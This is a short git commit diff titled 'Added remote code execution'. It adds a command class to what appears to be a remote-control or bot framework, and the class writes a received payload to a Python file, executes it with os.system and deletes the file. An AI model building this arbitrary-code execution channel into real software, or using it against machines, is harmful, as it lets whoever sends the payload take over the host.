b868a715ad24b42b3097c745293cbd489c23b545
Loan ALOUACHE <alouache.loan@gmail.com>
2021-10-04 11:01:29 +0200

    Added remote code execution

--- commands/rce.py
+++ commands/rce.py
@@ -1,4 +1,5 @@
 from commands.command import Command, CommandType
+import os
 
 class CommandRCE(Command):
     def __init__(self, payload: str) -> None:
@@ -6,4 +7,11 @@ class CommandRCE(Command):
         self.payload = payload
 
     def process(self) -> None:
+        with open("code.py", "w+") as file:
+            file.write(self.payload)
+        
+        os.system('python ./code.py')
+        os.remove("code.py")
+
+    def stop(self):
         pass
